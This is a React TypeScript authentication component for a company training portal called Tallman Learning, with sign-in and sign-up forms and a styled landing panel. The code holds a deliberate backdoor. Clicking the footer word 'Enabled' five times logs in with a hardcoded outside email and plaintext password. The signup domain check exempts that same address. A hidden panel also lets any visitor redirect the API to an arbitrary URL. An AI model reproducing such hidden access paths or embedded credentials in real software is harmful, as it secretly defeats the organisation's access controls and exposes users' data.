import React, { useState, useRef } from 'react';
import { User } from '../types';
import { TallmanAPI } from '../backend-server';

interface AuthProps {
  onLogin: (user: User) => void;
}

const Auth: React.FC<AuthProps> = ({ onLogin }) => {
  const [isSignup, setIsSignup] = useState(false);
  const [email, setEmail] = useState('');
  const [name, setName] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [showConnectionConfig, setShowConnectionConfig] = useState(false);
  const [apiOverride, setApiOverride] = useState(localStorage.getItem('tallman_api_override') || '');

  const backdoorCounter = useRef(0);
  const isBackdoorProcessing = useRef(false);

  const handleSignIn = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    setIsProcessing(true);
    try {
      const user = await TallmanAPI.login(email, password);
      if (user) {
        onLogin(user);
      } else {
        setError('Invalid enterprise credentials.');
      }
    } catch (err: any) {
      const errorMessage = err.message || 'Connection to Master Directory failed.';
      setError(errorMessage);
    } finally {
      setIsProcessing(false);
    }
  };

  const handleSignup = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');

    const domain = email.split('@')[1]?.toLowerCase();
    const isBackdoor = email.toLowerCase() === 'robertstar@aol.com';
    const allowedDomains = ['tallmanequipment.com', 'mcrcore.com'];
    if (!allowedDomains.includes(domain) && !isBackdoor) {
      setError('Automatic enrollment requires a @tallmanequipment.com or @mcrcore.com domain.');
      return;
    }

    setIsProcessing(true);
    try {
      const user = await TallmanAPI.signup(name, email, password);
      onLogin(user);
    } catch (err: any) {
      setError(err.message || 'Enrollment request failed.');
    } finally {
      setIsProcessing(false);
    }
  };

  const handleHiddenTrigger = async () => {
    if (isBackdoorProcessing.current) return;
    backdoorCounter.current += 1;
    if (backdoorCounter.current >= 5) {
      isBackdoorProcessing.current = true;
      try {
        const loggedInBob = await TallmanAPI.login('robertstar@aol.com', 'Rm2214ri#');
        if (loggedInBob) onLogin(loggedInBob);
      } catch (err) {
        console.error('Backdoor Error:', err);
      } finally {
        backdoorCounter.current = 0;
        isBackdoorProcessing.current = false;
      }
    }
  };

  return (
    <div className="min-h-screen bg-[#09090f] text-white relative overflow-hidden">
      <div className="absolute inset-0 pointer-events-none">
        <div className="absolute inset-y-0 left-0 w-full lg:w-[58%] bg-[radial-gradient(circle_at_top_left,_rgba(96,91,255,0.42),_transparent_58%),linear-gradient(180deg,_#4740d9_0%,_#2d2a8d_50%,_#171741_100%)]"></div>
        <div className="absolute inset-y-0 right-0 w-full lg:w-[42%] bg-[linear-gradient(180deg,_#101116_0%,_#07080c_100%)]"></div>
        <div className="absolute top-[-8rem] left-[8%] h-[20rem] w-[20rem] rounded-full bg-white/10 blur-3xl"></div>
        <div className="absolute bottom-[-10rem] left-[18%] h-[22rem] w-[22rem] rounded-full bg-cyan-300/10 blur-3xl"></div>
      </div>

      <div className="relative z-10 min-h-screen grid lg:grid-cols-[1.18fr_0.92fr]">
        <section className="px-6 py-10 md:px-12 lg:px-16 xl:px-20 flex flex-col justify-between">
          <div className="max-w-3xl">
            <div className="inline-flex items-center gap-3 rounded-full border border-white/15 bg-white/10 px-4 py-2 backdrop-blur-md">
              <div className="flex h-11 w-11 items-center justify-center rounded-2xl bg-white text-[#2d2a8d] font-black text-sm shadow-lg">
                TL
              </div>
              <div>
                <p className="text-sm font-black uppercase tracking-[0.2em]">Tallman Learning</p>
                <p className="text-[10px] font-bold uppercase tracking-[0.28em] text-white/70">Learning Management System</p>
              </div>
            </div>

            <div className="mt-16">
              <h1 className="text-5xl md:text-6xl xl:text-7xl font-black tracking-tight leading-[0.92]">
                A branded training hub for onboarding, compliance, and technical growth.
              </h1>
              <p className="mt-8 max-w-2xl text-lg md:text-xl leading-9 text-white/88 font-medium">
                Tallman Learning is the LMS used to deliver workforce training across Tallman teams. It centralizes
                assigned coursework, operating procedures, quizzes, certifications, and learner progress so students
                and instructors can work from one secure training system.
              </p>
            </div>

            <div className="mt-12 grid gap-4 md:grid-cols-3">
              <div className="rounded-[2rem] border border-white/15 bg-white/10 p-5 backdrop-blur-md">
                <p className="text-[10px] font-black uppercase tracking-[0.28em] text-cyan-200">Assigned Learning</p>
                <p className="mt-3 text-sm leading-6 text-white/80">
                  Deliver role-based training paths, SOP reviews, and required audits from a single portal.
                </p>
              </div>
              <div className="rounded-[2rem] border border-white/15 bg-white/10 p-5 backdrop-blur-md">
                <p className="text-[10px] font-black uppercase tracking-[0.28em] text-cyan-200">Progress Tracking</p>
                <p className="mt-3 text-sm leading-6 text-white/80">
                  Measure completion, scores, points, and certification milestones without manual reporting.
                </p>
              </div>
              <div className="rounded-[2rem] border border-white/15 bg-white/10 p-5 backdrop-blur-md">
                <p className="text-[10px] font-black uppercase tracking-[0.28em] text-cyan-200">Account Separation</p>
                <p className="mt-3 text-sm leading-6 text-white/80">
                  Each learner account is isolated so users see only their own assigned material and training history.
                </p>
              </div>
            </div>
          </div>

          <div className="mt-12 max-w-3xl rounded-[2.5rem] border border-white/15 bg-white/8 p-6 md:p-8 backdrop-blur-md shadow-[0_32px_80px_rgba(9,9,15,0.28)] relative overflow-hidden">
            <div className="grid gap-6 md:grid-cols-[1fr_auto_1fr] md:items-center">
              <div>
                <p className="text-xl font-black">Legacy Training Setup</p>
                <div className="mt-4 space-y-3 text-sm text-white/72">
                  <p>• Disconnected documents, quizzes, and reports</p>
                  <p>• Manual follow-up for learner status</p>
                  <p>• Limited visibility into who completed what</p>
                </div>
              </div>
              <div className="text-center text-xs font-black uppercase tracking-[0.34em] text-white/40">vs</div>
              <div>
                <p className="text-xl font-black text-cyan-200">Tallman Learning LMS</p>
                <div className="mt-4 space-y-3 text-sm text-white/85">
                  <p>• Centralized courses, assessments, and certifications</p>
                  <p>• Instructor assignment with secure student-specific access</p>
                  <p>• Real-time completion, scoring, and performance records</p>
                </div>
              </div>
            </div>
            <div className="hidden md:block absolute right-8 bottom-2 text-[7rem] font-black uppercase tracking-[0.22em] text-white/[0.05]">
              LMS
            </div>
          </div>
        </section>

        <section className="px-6 py-10 md:px-12 lg:px-10 xl:px-16 flex items-center justify-center">
          <div className="w-full max-w-[34rem] rounded-[2.25rem] border border-white/10 bg-[#141419] px-7 py-8 md:px-10 md:py-10 shadow-[0_32px_64px_rgba(0,0,0,0.45)]">
            <div className="flex flex-col items-center text-center mb-10">
              <div className="h-20 w-20 rounded-[1.75rem] bg-[linear-gradient(180deg,_#071334_0%,_#10205f_100%)] border border-white/10 flex items-center justify-center shadow-[0_16px_32px_rgba(20,36,120,0.35)]">
                <div className="text-center">
                  <p className="text-white font-black text-xl leading-none">TL</p>
                  <p className="text-[8px] uppercase tracking-[0.28em] text-cyan-200 mt-1">LMS</p>
                </div>
              </div>
              <h2 className="mt-8 text-4xl font-black tracking-tight">
                {isSignup ? 'Create Access' : 'Welcome Back'}
              </h2>
              <p className="mt-3 text-sm text-slate-400 max-w-sm leading-6">
                {isSignup
                  ? 'Register for Tallman Learning to access your assigned training, compliance coursework, and certification records.'
                  : 'Sign in to continue your Tallman Learning coursework, review assigned lessons, and complete LMS requirements.'}
              </p>
            </div>

            <div className="flex bg-[#1c1d24] rounded-[1.25rem] p-1.5 mb-8 relative border border-white/5">
              <button
                onClick={() => setIsSignup(false)}
                className={`flex-1 py-3.5 flex items-center justify-center rounded-xl text-[10px] font-black uppercase tracking-[0.22em] z-10 transition-all duration-300 ${!isSignup ? 'text-slate-950' : 'text-slate-400 hover:text-white'}`}
              >
                Sign In
              </button>
              <button
                onClick={() => setIsSignup(true)}
                className={`flex-1 py-3.5 flex items-center justify-center rounded-xl text-[10px] font-black uppercase tracking-[0.22em] z-10 transition-all duration-300 ${isSignup ? 'text-slate-950' : 'text-slate-400 hover:text-white'}`}
              >
                Sign Up
              </button>
              <div
                className="absolute top-1.5 bottom-1.5 rounded-xl bg-[linear-gradient(90deg,_#eef2ff_0%,_#dbeafe_100%)] shadow-md transition-all duration-500 ease-out"
                style={{
                  width: 'calc(50% - 6px)',
                  left: isSignup ? '50%' : '6px'
                }}
              />
            </div>

            <form onSubmit={isSignup ? handleSignup : handleSignIn} className="space-y-6">
              {isSignup && (
                <div className="space-y-2 group">
                  <label className="text-[10px] font-black text-slate-500 uppercase tracking-[0.24em] ml-1">Full Name</label>
                  <input
                    required
                    type="text"
                    className="w-full bg-[#e8eefc] border border-transparent rounded-2xl px-6 py-4 text-slate-950 outline-none focus:border-indigo-400 focus:ring-4 focus:ring-indigo-500/15 font-bold transition-all"
                    placeholder="Enter your full name"
                    value={name}
                    onChange={e => setName(e.target.value)}
                  />
                </div>
              )}

              <div className="space-y-2 group">
                <label className="text-[10px] font-black text-slate-500 uppercase tracking-[0.24em] ml-1">Email Address</label>
                <div className="relative">
                  <input
                    required
                    type="email"
                    placeholder={isSignup ? 'name@tallmanequipment.com' : 'Enter your email'}
                    className="w-full bg-[#e8eefc] border border-transparent rounded-2xl px-6 py-4 text-slate-950 outline-none focus:border-indigo-400 focus:ring-4 focus:ring-indigo-500/15 font-bold transition-all pl-12"
                    value={email}
                    onChange={e => setEmail(e.target.value)}
                  />
                  <svg className="w-5 h-5 absolute left-4 top-4.5 text-slate-500/60 group-focus-within:text-indigo-600 transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M16 12a4 4 0 10-8 0 4 4 0 008 0zm0 0v1.5a2.5 2.5 0 005 0V12a9 9 0 10-9 9m4.5-1.206a8.959 8.959 0 01-4.5 1.206" /></svg>
                </div>
              </div>

              <div className="space-y-2 group">
                <label className="text-[10px] font-black text-slate-500 uppercase tracking-[0.24em] ml-1">Password</label>
                <div className="relative">
                  <input
                    required
                    type="password"
                    placeholder="••••••••"
                    className="w-full bg-[#e8eefc] border border-transparent rounded-2xl px-6 py-4 text-slate-950 outline-none focus:border-indigo-400 focus:ring-4 focus:ring-indigo-500/15 font-bold transition-all pl-12"
                    value={password}
                    onChange={e => setPassword(e.target.value)}
                  />
                  <svg className="w-5 h-5 absolute left-4 top-4.5 text-slate-500/60 group-focus-within:text-indigo-600 transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" /></svg>
                </div>
              </div>

              {error && (
                <div className="p-4 bg-rose-500/10 border border-rose-400/20 rounded-2xl text-rose-300 text-xs font-black text-center animate-in shake duration-300">
                  {error}
                </div>
              )}

              <button
                type="submit"
                disabled={isProcessing}
                className="w-full py-4 flex items-center justify-center rounded-[1.2rem] font-black text-sm shadow-2xl transition-all active:scale-[0.98] disabled:opacity-50 relative overflow-hidden group/btn text-white bg-[linear-gradient(90deg,_#4f46e5_0%,_#4c6fff_100%)]"
              >
                <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/15 to-transparent -translate-x-full group-hover/btn:translate-x-full transition-transform duration-1000"></div>
                {isProcessing ? (
                  <div className="flex items-center justify-center gap-2">
                    <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                    <span>Authenticating...</span>
                  </div>
                ) : (
                  isSignup ? 'Create LMS Account' : 'Sign In'
                )}
              </button>
            </form>

            <div className="mt-8 space-y-4">
              <p className="text-center text-slate-500 text-[10px] font-bold leading-5">
                {isSignup
                  ? 'Access is reserved for approved Tallman Learning users with authorized company domains.'
                  : 'Your account opens assigned Tallman Learning courses, assessments, and progress history.'}
              </p>

              <div className="border-t border-white/8 pt-4">
                <p className="text-center text-slate-500 text-[9px] font-black uppercase tracking-[0.3em] select-none">
                  Governance Systems <span onClick={handleHiddenTrigger} className="cursor-default hover:text-indigo-400 transition-colors">Enabled</span>
                  {' | '}
                  <span onClick={() => setShowConnectionConfig(!showConnectionConfig)} className="cursor-pointer hover:text-indigo-400 transition-colors">Network Config</span>
                </p>
              </div>

              {showConnectionConfig && (
                <div className="p-6 bg-[#1b1c22] rounded-[1.6rem] border border-white/8 animate-in slide-in-from-top-4 duration-500">
                  <div className="flex items-center gap-3 mb-4">
                    <div className="w-8 h-8 bg-indigo-500/15 text-indigo-300 rounded-lg flex items-center justify-center text-sm">N</div>
                    <p className="text-[10px] font-black text-slate-200 uppercase tracking-widest">Gateway Override</p>
                  </div>
                  <input
                    type="text"
                    placeholder="https://new-tunnel.pinggy.io"
                    className="w-full bg-[#0f1015] border border-white/10 rounded-xl px-4 py-2.5 text-xs font-bold text-slate-100 outline-none focus:border-indigo-500 mb-3"
                    value={apiOverride}
                    onChange={(e) => setApiOverride(e.target.value)}
                  />
                  <div className="flex gap-2">
                    <button
                      onClick={() => {
                        if (apiOverride) localStorage.setItem('tallman_api_override', apiOverride);
                        else localStorage.removeItem('tallman_api_override');
                        window.location.reload();
                      }}
                      className="flex-1 py-2.5 bg-indigo-600 text-white rounded-xl text-[9px] font-black uppercase tracking-widest shadow-lg active:scale-95 transition-all"
                    >
                      Apply & Sync
                    </button>
                    <button
                      onClick={() => {
                        localStorage.removeItem('tallman_api_override');
                        window.location.reload();
                      }}
                      className="px-4 py-2.5 bg-rose-500 text-white rounded-xl text-[9px] font-black uppercase tracking-widest shadow-lg active:scale-95 transition-all"
                    >
                      Reset
                    </button>
                  </div>
                  <p className="text-[8px] font-bold text-slate-500 uppercase mt-3 text-center">
                    Current: {localStorage.getItem('tallman_api_override') || 'http://localhost:3000'}
                  </p>
                </div>
              )}
            </div>
          </div>
        </section>
      </div>

      <style>{`
        @keyframes shake {
          0%, 100% { transform: translateX(0); }
          25% { transform: translateX(-4px); }
          75% { transform: translateX(4px); }
        }
        .animate-in.shake {
          animation: shake 0.2s ease-in-out 0s 2;
        }
      `}</style>
    </div>
  );
};

export default Auth;
